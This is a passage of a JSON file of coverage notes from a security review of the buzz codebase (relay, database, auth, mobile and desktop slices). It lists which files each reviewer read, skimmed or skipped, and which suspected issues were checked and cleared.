  "coverage_note": "Read in full, line by line: all 22 .rs files under crates/buzz-core/src \u2014 lib.rs, event.rs, error.rs, verification.rs, filter.rs, kind.rs, network.rs, tenant.rs, relay.rs, channel.rs, presence.rs, invite.rs, observer.rs, agent_turn_metric.rs, engram.rs, git_perms.rs, and the pairing submodule (mod.rs, crypto.rs, types.rs, session.rs, qr.rs). qr.rs was read to line 250 (the remainder is unit tests); session.rs was read to line 780 (the remainder is unit tests). Cargo.toml read for the dependency set.\n\nBecause the breadth pass explicitly skipped cross-crate call-site verification, I spent most of the budget there. Files opened outside the slice: crates/buzz-relay/src/handlers/req.rs (filter-layer p-gate, event_visible_to_reader, result-gated pushdown helpers), crates/buzz-relay/src/handlers/event.rs (live fan-out, filter_fanout_by_access, cross-pod Redis fan-out), crates/buzz-relay/src/handlers/ingest.rs (required_scope_for_kind allowlist, NIP-AM envelope validation, relay-only-kind gate), crates/buzz-relay/src/handlers/side_effects.rs (kind 30622 / 44100 / 44101 emission), crates/buzz-relay/src/subscription.rs (fan-out index + push_match), crates/buzz-relay/src/api/git/policy.rs (git_perms consumer), crates/buzz-workflow/src/executor.rs (is_private_ip consumer, SSRF path), plus the vendored nostr 0.44.6 sources for Kind and Filter deserialization.\n\nThings I checked and cleared rather than reported: `is_relay_only_kind` omits several documented relay-signed kinds (8000/8001/8002/8003/13535) but `required_scope_for_kind` is a strict allowlist that rejects them anyway (ingest.rs:319), so it is not exploitable; `parse_protection_tags` failures fail closed at policy.rs:296-300; the SSRF path pins DNS, disables proxies and redirects, and caps the response body, so `is_private_ip`'s missing IPv4 multicast (224.0.0.0/4) and reserved (240.0.0.0/4) ranges are unreachable in practice; `extract_refs` looked like a candidate for quadratic blow-up but the scan is amortized linear; `normalize_host` variants that fail to collapse (e.g. \"relay.example:443.\") fail closed rather than splitting a tenant; `engram::validate_and_decrypt` is safe without a prior signature check because forging requires the ECDH conversation key; the NIP-AB pairing state machine verifies id+signature (session.rs:633) before any decrypt and its dedup set is bounded.\n\nNot opened: buzz-db, buzz-auth, buzz-search, buzz-pubsub, buzz-sdk, buzz-cli (beyond one grep hit), the TypeScript/Dart clients, and docs/nips/*. I did not confirm whether any non-Rust consumer of `decrypt_agent_turn_metric` / `decrypt_observer_payload` verifies the event first, so I did not re-report the breadth pass's observer.rs finding."
 },
 {
  "slice": "mobile",
  "files_read": 49,
  "finding_count": 8,
  "coverage_note": "Read in depth (whole file, line by line): mobile/lib/features/channels/timeline_message.dart (the formatTimeline deletion/edit/reaction folding, ~lines 320-600), mobile/lib/features/channels/message_content.dart, mobile/lib/features/channels/message_actions.dart (download/filename helpers), mobile/lib/features/channels/channel_window.dart, mobile/lib/features/channels/deep_link_dispatcher.dart, mobile/lib/features/channels/channel_link_navigation.dart, mobile/lib/features/channels/unread_badge/should_notify_for_event.dart, mobile/lib/features/channels/unread_badge/is_high_priority_event.dart, mobile/lib/features/channels/read_state/read_state_format.dart, mobile/lib/features/channels/read_state/read_state_manager.dart, mobile/lib/features/pairing/pairing_provider.dart, pairing_crypto.dart, pairing_socket.dart, pairing_page.dart, pairing_qr_scanner.dart, mobile/lib/features/invites/invite_join_provider.dart, mobile/lib/shared/relay/{relay_session,relay_socket,nostr_models,nostr_filters,media_auth,media_image,media_upload,animated_image_sanitizer,mp4_fast_start,relay_validation}.dart, mobile/lib/shared/crypto/{nip44,ecdh,nip_oa}.dart, mobile/lib/shared/deeplink/{deep_link,pending_deep_link_provider}.dart, mobile/lib/shared/community/community_storage.dart, mobile/lib/shared/syntax_highlight.dart, mobile/lib/main.dart. Native shells read fully: android/app/src/main/AndroidManifest.xml plus the debug/profile variants, android/app/build.gradle.kts, android/app/src/main/kotlin/.../MainActivity.kt, ios/Runner/Info.plist, ios/Runner/AppDelegate.swift, ios/Runner/SceneDelegate.swift. To confirm the parser differential in finding 1 I followed the call out of the slice into crates/buzz-relay/src/handlers/ingest.rs (validate_edit_ownership, the kind:5 e-tag count gate, the skip_membership list) and cross-checked desktop/src/features/messages/lib/formatTimelineMessages.ts and docs/nips/NIP-DV.md. Partially read: channels_provider.dart (lines ~150-380 only), channel_detail_page.dart (only the formatTimeline call site ~330-370), timeline_message.dart lines 1-320 skimmed. Never opened: AndroidMediaSanitizer.kt, MediaSanitizer.swift, InlinePhotoPicker.swift, NativeAttachmentPopover*.swift, RunnerTests.swift, Podfile/pbxproj, scripts/*.mjs, and essentially all pure-presentation widget files (theme/*, widgets/*, emoji_picker/*, compose_bar/* except where grepped, forum/*, activity/*, pulse/*, search/*, settings/*). I did not open the agent_activity observer/transcript files or channel_messages_provider.dart in full, so the live-subscription merge path and the agent observer frames are only covered indirectly through relay_session.dart and channel_window.dart."
 },
 {
  "slice": "mobile",
  "files_read": 36,
  "finding_count": 9,
  "coverage_note": "Read in depth (full file): relay_session.dart, relay_socket.dart, relay_provider.dart, signed_event_relay.dart, nostr_models.dart, media_upload.dart, mp4_fast_start.dart, identity_scoped_prefs.dart, channel_messages_provider.dart, channel_window.dart, channels_provider.dart, send_message_provider.dart, pending_local_messages_provider.dart, channel_typing_provider.dart, read_state_manager/storage/format/time.dart, channel_stars_manager/storage.dart, unread_badge_provider.dart, observer_subscription.dart, deep_link_dispatcher.dart, deep_link.dart, invite_join_provider.dart, pairing_socket.dart, auth_provider.dart, community_storage.dart, community_provider.dart, nip44.dart, ecdh.dart, hkdf.dart, reminder_service.dart, and the native shells MainActivity.kt (Android) and AppDelegate.swift (iOS) \u2014 the native method-channel handlers the breadth pass admitted it skipped. Partially read: compose_bar.dart (clipboard/upload wiring only, lines 1-250). Skimmed via listing only: channel mutes/sections/thread-follows storage (same pattern as channel_stars, spot-checked one), forum/pulse/activity/profile/search providers, all UI-only widget/theme files. Never opened: pairing_provider.dart and pairing_crypto.dart (breadth pass covered them in depth), media_auth.dart, relay_validation.dart, nip_oa.dart, AndroidMediaSanitizer.kt, MediaSanitizer.swift, InlinePhotoPicker.swift and other popover Swift files, AndroidManifest.xml/Info.plist (breadth covered), build.gradle/Podfile, scripts/*.mjs. Crypto files were checked against the NIP-44 spec (padding, HKDF, MAC ordering) and found conformant except a non-canonical-padding leniency I judged not reportable. Findings verified by re-reading the cited lines; line numbers taken directly from Read output."
 },
 {
  "slice": "mobile",
  "files_read": 40,
  "finding_count": 8,
  "coverage_note": "Read in depth (Lens B \u2014 crypto/keys/identity): lib/shared/crypto/{nip44,hkdf,ecdh,nip_oa}.dart; lib/features/pairing/{pairing_crypto,pairing_provider,pairing_page,pairing_qr_scanner}.dart and pairing_qr_scanner/scanner_camera.dart; lib/shared/auth/{auth,auth_provider}.dart; lib/shared/community/{community,community_storage}.dart; lib/shared/relay/{relay_socket,relay_session,relay_provider,relay_validation,media_auth,nostr_models,nostr_filters,signed_event_relay,identity_scoped_prefs}.dart; lib/shared/deeplink/{deep_link,pending_deep_link_provider}.dart; lib/features/channels/deep_link_dispatcher.dart; lib/features/invites/invite_join_provider.dart; lib/features/channels/agent_activity/observer_subscription.dart; lib/shared/mentions/agent_identity_provider.dart; lib/features/profile/{profile_provider,user_profile}.dart; lib/features/settings/settings_page/connection_section.dart; lib/app.dart; android/app/src/main/AndroidManifest.xml; ios/Runner/Info.plist; ios/Runner/AppDelegate.swift; android MainActivity.kt (via cat, partially truncated in the tail); the download/open-attachment path in lib/features/channels/message_content.dart (lines 1-72, 330-375). Also read out-of-slice for context: crates/buzz-core/src/pairing/NIP-AB.md (spec the mobile pairing code cites) and grepped the whole repo to confirm no producer of the legacy buzz:// pairing format remains. Skimmed only: lib/shared/relay/media_upload.dart (auth-event construction, lines 380-520; not the sanitizer/transcode paths), pubspec.yaml dependency pins, remaining Kotlin media-sanitizer code. Never opened: the bulk of the UI widget tree (theme/, widgets/, channels_page/, compose_bar/, emoji_picker/, forum/, activity/, pulse/, search/), read_state/mutes/sections/stars storage internals (I confirmed only that they all key off getConversationKey(self,self)), ios/Runner/{InlinePhotoPicker,MediaSanitizer,NativeAttachmentPopover*}.swift, mobile/scripts/, Podfile/build.gradle, and the animated-image/mp4 parsers. No entitlements file exists under ios/Runner, so nothing to review there."
 },
 {
  "slice": "desktop-shared",
  "files_read": 24,
  "finding_count": 3,
  "coverage_note": "Read in depth (Lens B: crypto/keys/identity focus): api/relayClientSession.ts (full connect/AUTH/subscribe/publish/reconnect state machine), api/readOnlyRelayClient.ts, api/observerRelay.ts, api/relayClosedRecovery.ts, api/relayReconnectReplay.ts, api/relayClientShared.ts, api/moderation.ts, api/invites.ts, api/tauri.ts (full, incl. signRelayEvent/createAuthEvent/getNsec/nip44/pairing surface), api/tauriIdentity.ts, api/tauriAgentAuth.ts, api/tauriMedia.ts, lib/authors.ts, lib/nostrUtils.ts, lib/pubkey.ts, lib/clipboard.ts, lib/rehypeImageGallery.ts, ui/markdown/nodeCache.ts, ui/markdown/utils.ts (urlTransform), shared/deep-link.ts. Followed two calls out of slice into features/profile (nostrBindCallback.ts, nostrIdentityBinding.ts, NostrBindConsentDialog.tsx) because they are the identity-binding sink reached from shared/deep-link.ts. Skimmed/grepped: markdown.tsx link-render section (~150-160, 1276-1470, 1776-1990), the tauri*.ts thin wrappers. Did NOT open the ~300 remaining tauri*/features/hooks/layout files, most ui components, or any Rust backend (out of slice) \u2014 so relay-side clamps on created_at, NIP-42 challenge issuance, and the sign_nostr_identity_binding origin/expiry enforcement are stated as caveats, not verified. Did not re-audit the two breadth-pass findings; findings below are additive."
 },
 {
  "slice": "desktop-messages",
  "files_read": 56,
  "finding_count": 6,
  "coverage_note": "Read in depth (whole file or the security-relevant majority): messages/ui/MessageRow.tsx, ui/DiffMessage.tsx, ui/DiffViewer.tsx, ui/BotIdenticon.tsx, ui/configNudgeAuthPubkey.ts, ui/timelineRetention.ts; messages/lib/messageLink.ts, openPopoverLink.ts, useLinkEditor.tsx, remarkMessageLinks.ts, hasMention.ts, normalizeMentionClipboard.ts, agentSnapshotClipboard.ts, imetaMediaMarkdown.ts, waveMessage.ts, parseDiff.ts, dateFormatters.ts, applyEditTagOverlay.mjs, threading.ts, timelineSnapshot.ts, canManageMessage.ts, useMessageEmoji.ts; messages/useLoadMissingAncestors.ts; channels/readState/readStateManager.ts; custom-emoji/hooks.ts. Followed the render chain out of the slice and read in depth: shared/ui/markdown.tsx (all 2013 lines), shared/ui/markdown/{nodeCache,utils,InlineEmojiPopover,AgentSnapshotCard,parseImeta}, shared/ui/markdownFileCard.ts, shared/lib/{remarkCustomEmoji,remarkMentions,remarkChannelLinks,remarkSpoilers,createRemarkPrefixPlugin,mentionPattern,rehypeImageGallery,mediaUrl,linkPreview,useResolvedLinkPreviews,resolveMentionNames,url,computeConfigNudge,authors}, shared/api/customEmoji.ts. Read partially (targeted sections): formatTimelineMessages.ts (lines 200-500, the reaction/edit/author build), useUnreadChannels.ts (lines 95-150, 280-450, 560-680), useRichTextEditor.ts (Link extension config only), mentionHighlightExtension.ts (pattern builders only), useMediaUpload.ts (first 160 lines), channelWindowStore.ts (first 70), useLiveChannelUpdates.ts (first 80), crates/buzz-relay/src/handlers/ingest.rs (timestamp/content-size guards and gift-wrap branch), SECURITY.md. Grepped-but-not-opened: MessageReactions.tsx (confirmed the emojiUrl <img> sink by grep, did not read the file), all *.test.mjs files, remarkSpoilers callers. Never opened: the bulk of channels/ui/* (ChannelPane, ChannelScreen, MembersSidebar, AddChannelBot*, AgentSessionThreadPanel, ChannelManagement*), all of forum/ui/* (ForumComposer, ForumPostCard, ForumThreadPanel, ForumView), custom-emoji/ui/*, messages/ui composer components (MessageComposer, ComposerImageEditor, DraftsPanel, useDrafts, autocompletes), the virtualization/scroll hooks (useAnchoredScroll, useVirtualized*, virtualizedTimelineItems), channels/readState/{readStateFormat,readStateSnapshot,readStateStorage}, and the whole Rust side except the ingest guards noted. I did not run or instrument anything \u2014 all findings are static reads. The two timestamp findings are explicitly downgraded because I found a relay-side \u00b1900s drift guard that blocks them against a conforming relay."
 },
 {
  "slice": "db",
  "files_read": 20,
  "finding_count": 8,
  "coverage_note": "Read in depth (full or near-full): partition.rs, thread.rs (all non-test code), dm.rs (full), feed.rs (non-test code), usage.rs (non-test code), reaction.rs (full), moderation.rs (first ~420 lines, all core CRUD), relay_members.rs (lines 100-480: claim/remove/transfer/bootstrap), workflow.rs (lines 490-950: scheduled-fire claim, run/update, plus function inventory), push.rs (lines 1-1280: full non-test code \u2014 lease acceptance, gate lock, enqueue_wakes, claim/revalidate/complete fencing), replica_fence.rs (lines 1-800: fence ring, probe, floor-guard verification), event.rs (lines 1-1370: insert paths, query/count builders, soft-delete, thread-metadata tx), channel.rs (lines 1-1520: all non-test code), user.rs (lines 300-430), lib.rs (lines 2652-3000: routed thread/window reads and route_read; plus grep-driven inventory of its ~400 public methods), buzz-sdk/mentions.rs (lines 1-260). Followed calls out of the slice into buzz-relay/src/handlers/ingest.rs (lines 600-760, thread-metadata derivation), buzz-relay/src/api/bridge.rs (lines 1430-1590, COUNT pushdown gating \u2014 this cleared a suspected shared-gated COUNT mismatch as a non-bug), and buzz-relay/src/workflow_sink.rs (lines 280-360). Checked migrations/0001 for the DM participant_hash unique index and PK shapes; grepped all migrations for participant_hash. Skimmed only: git_repo.rs, admin_moderation.rs, archived_identities.rs, product_feedback.rs, api_token.rs, relay_invite.rs, migration.rs, error.rs (breadth pass had already read several of these in full), buzz-sdk nip_oa.rs/builders.rs/lib.rs (breadth pass covered builders.rs; I did not re-read it). Never opened: migrations 0002-0026 individually (only 0001 plus targeted greps), lib.rs regions outside lines ~2650-3000 and grep hits (its ~5000 lines of tests in particular), workflow.rs approval-token section past line 950, push.rs and replica_fence.rs test modules. Ran pattern sweeps across the whole slice for begin()/transaction usage, unwrap_or/let _= error swallowing, and integer casts."
 },
 {
  "slice": "core (crates/buzz-core)",
  "files_read": 38,
  "finding_count": 6,
  "coverage_note": "Read in full: crates/buzz-core/src/{lib,error,event,verification,observer,filter,agent_turn_metric,invite,relay,tenant,channel,presence}.rs and the whole pairing submodule (mod.rs, crypto.rs, types.rs, qr.rs, session.rs including its 550 lines of tests). Read in large part: kind.rs (lines ~110-320 and ~700-860 plus targeted greps over the full constant registry \u2014 I did not read every one of the ~200 kind doc blocks), engram.rs (lines 1-700; the remaining ~350 lines are spec test vectors I sampled), git_perms.rs (lines 1-620 covering RefPattern parse/match, UpdateKind, rule parsing and evaluate_ref_update/evaluate_push; lines 620-1027 are tests I did not read line-by-line), network.rs (lines 1-180 of logic; the rest is the IP-classification test suite). Also read crates/buzz-core/Cargo.toml (to confirm rand 0.10 CSPRNG and the absence of any logging dependency \u2014 buzz-core cannot leak secrets to logs because it has no logger).\n\nUnlike the breadth pass, I did cross-reference out of the slice, and that changed several conclusions. Concretely: (a) every caller of decrypt_observer_payload / validate_and_decrypt / decrypt_agent_turn_metric that I could find does verify the event first (buzz-acp/src/lib.rs:844, buzz-acp/src/engram_fetch.rs:118, buzz-cli/src/commands/mem.rs:163, desktop/src-tauri/src/commands/identity.rs:148-155, desktop/src-tauri/src/archive/pipeline.rs:122), so the breadth pass's observer.rs finding has no reachable caller today; (b) I chased a promising lead that kind.rs's is_relay_only_kind omits the relay-signed NIP-29 discovery kinds 39000/39001/39002 and traced it to consumers with no `authors` filter (buzz-acp/src/relay.rs:676, buzz-cli/src/commands/channels.rs:36) \u2014 but then found crates/buzz-relay/src/handlers/ingest.rs:319 (`_ => Err(\"restricted: unknown event kind\")`) is default-deny by kind, so those kinds cannot be client-submitted and the finding is dead. I am reporting that as a non-finding rather than shipping it.\n\nOut-of-slice files I opened partially while tracing: buzz-relay/src/handlers/{ingest,req,event,side_effects}.rs, buzz-relay/src/{subscription}.rs, buzz-relay/src/api/bridge.rs, buzz-relay/src/api/git/{policy,hook}.rs, buzz-acp/src/{lib,relay,engram_fetch}.rs, buzz-cli/src/commands/{mem,channels}.rs, desktop/src-tauri/src/commands/{engrams,identity}.rs, desktop/src-tauri/src/archive/pipeline.rs.\n\nNever opened: buzz-core test-only files beyond those noted, docs/nips/*.md (I relied on the in-code NIP citations), SECURITY.md.\n\nHonest assessment of the pairing module (the crypto centre of this slice): I looked hard for a signature-skip, a downgrade, a non-constant-time secret compare, a replay window, or an RNG weakness and did not find one. validate_event_basics calls event.verify() before every decrypt, transcript hashes and session IDs are compared with subtle::ConstantTimeEq, the ECDH shared secret is zeroized immediately after SAS derivation, Drop zeroizes session_secret/session_id/sas_input, and session_secret comes from rand 0.10's CSPRNG. The findings below are therefore weighted toward defence-in-depth and doc-vs-code drift rather than a direct break, and I have said so in each confidence field rather than inflating them."
 },
 {
  "slice": "desktop-shared (buzz/desktop/src/shared)",
  "files_read": 60,
  "finding_count": 7,
  "coverage_note": "Read in depth (full file, line by line): api/relayClientShared.ts, api/relayClosedRecovery.ts, api/relayReconnectReplay.ts, api/relayRateLimitGate.ts, api/relayClosedPolicy.ts, api/relayGateBoundary.ts, api/relayChannelFilters.ts, api/relayClientTimings.ts, api/readOnlyRelayClient.ts, api/relayClientSession.ts (lines 1-360, 360-705, 700-1087 \u2014 effectively the whole file), api/concurrency.ts, api/customEmoji.ts, api/invites.ts, api/inviteHelpers.ts, api/moderation.ts, api/observerRelay.ts, api/tauriMedia.ts, deep-link.ts, lib/mediaUrl.ts, lib/maskedLink.ts, lib/url.ts, lib/linkPreview.ts, lib/useResolvedLinkPreviews.ts, lib/nostrUtils.ts, lib/pubkey.ts, lib/authors.ts, lib/configNudge.ts, lib/computeConfigNudge.ts, lib/customEmojiTags.ts, lib/remarkCustomEmoji.ts, lib/remarkSpoilers.ts, lib/remarkMentions.ts, lib/remarkChannelLinks.ts, lib/mentionPattern.ts, lib/createRemarkPrefixPlugin.ts, lib/rehypeImageGallery.ts, lib/rehypeSearchHighlight.ts, lib/resolveMentionNames.ts, lib/animatedAvatar.ts, lib/clipboard.ts, theme/theme-loader.ts, ui/markdown/nodeCache.ts, ui/markdown/utils.ts, ui/markdown/parseImeta.ts, ui/markdown/mediaEntry.ts, ui/markdown/imageLightbox.ts, ui/markdown/InlineEmojiPopover.tsx, ui/markdown/MaskedLinkTooltip.tsx, ui/markdown/AgentSnapshotCard.tsx, ui/markdown/FileCard.tsx, ui/markdownFileCard.ts, ui/markdownUtils.ts, ui/config-nudge-attachment.tsx, ui/link-preview-attachment.tsx, ui/UserAvatar.tsx, ui/videoDownload.ts. Read in part: ui/markdown.tsx (lines 1-140, 1000-1260, 1260-1520, 1560-1740, 1750-2011 \u2014 the link, image, emoji, mention and render-entry sections; I did not read the ~500 lines of lightbox gesture/animation code in 250-1000), theme/ThemeProvider.tsx (lines 380-510 only), api/tauri.ts (grepped + read the sign_event/create_auth_event/get_event JSON.parse boundary at 440-500 and 640-690). I also stepped outside the slice to confirm reachability: grepped crates/buzz-relay and crates/buzz-db for created_at bounds checking (found none in the ingest path \u2014 only a DateTime::from_timestamp validity check at crates/buzz-relay/src/handlers/command_executor.rs:123) and for kind:30030 emoji-tag URL validation (none). Never opened: all of features/, hooks/, layout/, context/, styles/, constants/, most of ui/ (VideoPlayer.tsx 2213 lines, sidebar.tsx, carousel.tsx, EmojiBurstProvider.tsx, SpoilerParticles.tsx, buzz-logo/, and the other primitives), most api/tauri*.ts variants (tauriChannels, tauriTeams, tauriWorkflows, tauriEngrams, tauriPersonas, tauriProfiles, tauriMesh, tauriGlobalAgentConfig, tauriManagedAgent*, tauriArchive, tauriIdentity*, projectGit.ts), all *.test.mjs files, lib/emojiSearch.ts, lib/localStorageQuota.ts, lib/trimMapToSize.ts, hooks/escapeSurfaces.ts, features/store.ts. My bias was to follow relay-supplied bytes (WebSocket frames -> event.created_at / tags / content) all the way to the state and DOM they reach, so the untraced areas are mostly presentation code with no untrusted-input entry point of its own."
 },
 {
  "slice": "db",
  "files_read": 31,
  "finding_count": 6,
  "coverage_note": "Read in depth: crates/buzz-sdk/src/lib.rs (full), crates/buzz-sdk/src/nip_oa.rs (full non-test), crates/buzz-sdk/src/mentions.rs (full), crates/buzz-sdk/src/builders.rs (validation helpers lines 1-540, member/contact/DM/presence builders 560-820, 1536-1600), crates/buzz-db/src/lib.rs (insert_mentions, Db struct, ReadSession/route_proof/RoutePredicate 228-479, create_community_with_owner 1395-1470, backfill_d_tags/allowlist 3900-3940, relay-member wrappers 4027-4091, DM wrappers 2588-2649), crates/buzz-db/src/event.rs (EventQuery, extract_d_tag/not_before, huddle link, insert_event, row_to_stored_event, query_events_on 330-573 and count_events_on 626-768 side by side, reminder claim/release 1450-1537), crates/buzz-db/src/feed.rs (full), crates/buzz-db/src/dm.rs (1-240 plus open_dm/hide_dm), crates/buzz-db/src/moderation.rs (1-620 non-test), crates/buzz-db/src/relay_members.rs (1-420), crates/buzz-db/src/relay_invite.rs (1-372 non-test), crates/buzz-db/src/archived_identities.rs (full non-test), crates/buzz-db/src/workflow.rs (approval CRUD 920-1130), crates/buzz-db/src/channel.rs (is_member/membership_pairs/get_members/get_accessible_channel_ids/list_channels 639-830, get_accessible_channels 936-990), crates/buzz-db/src/migration.rs (1-400), crates/buzz-db/src/usage.rs (1-180 non-test), crates/buzz-db/src/replica_fence.rs (module contract 1-120), crates/buzz-db/src/push.rs (accept_lease_event 180-415), migrations/0001_initial_schema.sql (events/channels/channel_members/event_mentions/relay_members/archived_identities sections) and migrations/0021_created_at_fence_floor.sql (full). Followed calls OUT of the slice to confirm reachability: buzz-relay/src/api/relay_members.rs (check_relay_membership), buzz-relay/src/handlers/auth.rs, handlers/req.rs, handlers/count.rs, handlers/command_executor.rs, handlers/relay_admin.rs, handlers/identity_archive.rs, api/bridge.rs, state.rs, plus docs/nips/NIP-OA.md. Ran a mechanical scan of every sqlx::query literal in crates/buzz-db/src for SQL missing a community_id predicate (all hits were operator-global tables, advisory locks, catalog probes, or #[cfg(test)] helpers) and a format!-into-SQL scan (only compile-time constants reach the string, no injection). Skimmed only: crates/buzz-db/src/push.rs beyond accept_lease_event (wake/lease claim machinery 419-1260), workflow.rs outside the approval section, replica_fence.rs body below line 120, channel.rs create/update/archive paths, thread.rs, api_token.rs. Never opened: crates/buzz-db/src/admin_moderation.rs, git_repo.rs, partition.rs, product_feedback.rs, reaction.rs, user.rs, error.rs, and migrations 0002-0020 and 0022-0026 individually (0006/0021 were read; the rest only via migration.rs's embedded assertions)."
 },
 {
  "slice": "db",
  "files_read": 44,
  "finding_count": 5,
  "coverage_note": "Read in depth (full or near-full): crates/buzz-sdk/src/lib.rs, crates/buzz-sdk/src/nip_oa.rs (whole file including tests), crates/buzz-db/src/api_token.rs, crates/buzz-db/src/relay_invite.rs, crates/buzz-db/src/archived_identities.rs, crates/buzz-db/src/relay_members.rs, crates/buzz-db/src/user.rs, crates/buzz-db/src/dm.rs, crates/buzz-db/src/moderation.rs, crates/buzz-db/src/reaction.rs, crates/buzz-db/src/git_repo.rs, crates/buzz-db/src/product_feedback.rs, crates/buzz-db/src/feed.rs, and large sections of crates/buzz-db/src/lib.rs (lines 60-500, 1600-1760 index, 3350-3550 api-token/workflow accessors, 4420-4900 replace_addressable_event / publish_nip43_membership_locked / replace_parameterized_event), crates/buzz-db/src/event.rs (150-620, 775-900), crates/buzz-db/src/thread.rs (get_channel_window_on in full), crates/buzz-db/src/push.rs (accept_lease_event + replace_lease in full, rest by symbol index), crates/buzz-db/src/replica_fence.rs (ReplicaFence state machine + floor-guard verify entry points), crates/buzz-db/src/migration.rs (run_migrations + the pre-0007 ambiguity guard), crates/buzz-db/src/admin_moderation.rs (structs + list_reports). Followed calls OUT of the slice to confirm reachability: crates/buzz-relay/src/api/mod.rs (relay_members NIP-OA membership + materialize), crates/buzz-relay/src/handlers/auth.rs (NIP-42 path), crates/buzz-relay/src/handlers/ingest.rs (verify_event + \u00b1900s timestamp envelope), crates/buzz-relay/src/handlers/side_effects.rs (NIP-09 deletion authorization), crates/buzz-relay/src/handlers/command_executor.rs (approval grant/deny), crates/buzz-relay/src/handlers/relay_admin.rs, crates/buzz-relay/src/api/admin/{mod,auth}.rs, crates/buzz-relay/src/router.rs, crates/buzz-relay/src/state.rs, crates/buzz-core/src/{invite,observer}.rs, docs/nips/NIP-OA.md, docs/admin/README.md. Migrations: read 0001 (grepped for constraints/unique indexes), 0010, 0021, 0025 in full; the other 22 .sql files were NOT opened individually \u2014 only their names and the migration.rs assertions. Skimmed only: crates/buzz-db/src/channel.rs (membership/accessible-channel functions read; the ~1700 lines of create/update/archive/reap were skimmed), crates/buzz-db/src/workflow.rs (token-hash and approval functions read; row mappers and workflow-run CRUD skimmed), crates/buzz-sdk/src/builders.rs (observer-frame, approval, moderation, and the validation helpers at the top read; the other ~30 builders skimmed \u2014 the breadth pass already covered these). Never opened: crates/buzz-db/src/{usage.rs, partition.rs, error.rs}, crates/buzz-sdk/src/mentions.rs, and the bulk of crates/buzz-db/src/push.rs's test module. No file was edited."
 },
 {
  "slice": "relay (crates/buzz-relay) \u2014 Lens C: correctness",
  "files_read": 15,
  "finding_count": 7,
  "coverage_note": "Read in depth (whole file or the whole non-test body): crates/buzz-relay/src/connection.rs, crates/buzz-relay/src/subscription.rs, crates/buzz-relay/src/handlers/close.rs, crates/buzz-relay/src/tunnel/reliable.rs, crates/buzz-relay/src/api/git/pack_cache.rs, crates/buzz-relay/src/storage_sweep.rs (lines 1-330). Read substantially: crates/buzz-relay/src/handlers/req.rs (lines 1-848, i.e. the whole non-test body: entry gates, registration, historical delivery, search lane, helper predicates), crates/buzz-relay/src/handlers/event.rs (lines 1-1160: fan-out helpers, dispatch_persistent_event(_inner), handle_event, ephemeral path, agent-observer path), crates/buzz-relay/src/handlers/ingest.rs (lines 380-560 and 1820-2820 \u2014 the ingest_event_inner gate chain from relay-only-kind through storage/compensation, plus the membership/scope helpers), crates/buzz-relay/src/state.rs (lines 28-480 and 1080-1210: ConnectionManager, CommunityConnectionRegistry, caches), crates/buzz-relay/src/handlers/side_effects.rs (lines 1-220: subscription eviction paths), crates/buzz-relay/src/api/media.rs (lines 80-410: upload admission, rate limit, in-flight permit). Cross-crate follow-outs read: crates/buzz-core/src/kind.rs (lines 760-880 \u2014 is_relay_admin_kind / is_identity_archive_request_kind / is_command_kind / is_relay_only_kind / is_global_only_kind consumers), crates/buzz-pubsub/src/lib.rs (lines 120-300 \u2014 retain_topic/release_topic refcounting, the other half of the leak in finding 1). Skimmed only (grep + targeted reads, not line-by-line): config.rs, handlers/count.rs, api/git/* other than pack_cache.rs, protocol.rs. NEVER OPENED: api/bridge.rs, api/invites.rs, api/operator.rs, api/events.rs, api/nip05.rs, api/mesh_demo.rs, api/git/transport.rs, api/git/cas_publish.rs, api/git/store.rs, api/git/hydrate.rs, api/git/policy.rs, api/git/manifest*.rs, api/git/hook.rs, audio/*, handlers/auth.rs, handlers/command_executor.rs, handlers/community_provisioning.rs, handlers/identity_archive.rs, handlers/imeta.rs, handlers/moderation_*.rs, handlers/product_feedback.rs, handlers/push_lease.rs, handlers/relay_admin.rs, handlers/report.rs, main.rs, router.rs, admission.rs, invite_token.rs, webhook_secret.rs, telemetry.rs, tenant.rs, mesh_boot.rs, push_runtime.rs, workflow_sink.rs, nip11.rs, metrics.rs, conformance/*, tunnel/directory.rs, examples/*. So this is a deep pass over the WS ingest/subscription/fan-out spine plus a few adjacent subsystems, not crate-wide coverage."
 },
 {
  "slice": "auth",
  "files_read": 22,
  "finding_count": 3,
  "coverage_note": "Read in full (line-by-line): all of buzz-auth \u2014 lib.rs, nip42.rs, nip98.rs, nip98_replay.rs, rate_limit.rs, scope.rs, access.rs, error.rs. Read in full across the boundary: buzz-pubsub/src/nip98_replay.rs (Redis replay impl) and buzz-pubsub/src/rate_limiter.rs (Redis rate-limit impl), buzz-relay/src/admission.rs, buzz-relay/src/handlers/auth.rs (NIP-42 handler), buzz-relay/src/api/bridge.rs lines 1-1393 in depth plus targeted reads of the two IngestAuth grant sites, buzz-relay/src/api/git/transport.rs lines 120-249, buzz-relay/src/handlers/ingest.rs (scope-map + enforcement at 1884-1915, 240-284), buzz-media/src/auth.rs (Blossom 24242, adjacent slice \u2014 read for comparison, not reported). In buzz-acp I read filter.rs (partial), relay.rs sign_nip98 path (262-364), engram_fetch.rs in full, and grepped acp.rs/pool.rs/queue.rs/config.rs/setup_mode.rs for auth/secret/spawn surface. I did NOT read acp.rs, pool.rs, queue.rs, config.rs, usage.rs, observer.rs, pool_lifecycle.rs line-by-line \u2014 grep confirmed buzz-acp never calls into buzz-auth (it only signs OUTGOING NIP-98 tokens client-side and decrypts its own NIP-AE engrams via buzz-core), so that ~30k lines is agent-subprocess lifecycle, not authn/authz. I did not open bridge.rs lines 1394-3770 (count_events_authed and search paths) line-by-line; they mirror query_events_authed which I read fully. Did not open operator.rs/invites.rs bodies (only confirmed via grep they pass require_payload=true). The buzz-auth verifiers themselves (nip42/nip98 signature/id/timestamp/url/method checks, replay ordering, fail-closed rate limit) are sound; the reported items are an over-grant that reaches an HTTP entry point the breadth did not cite, a loopback-normalization divergence inside buzz-auth, and a body-binding gap on the read endpoints."
 },
 {
  "slice": "desktop-shared",
  "files_read": 47,
  "finding_count": 2,
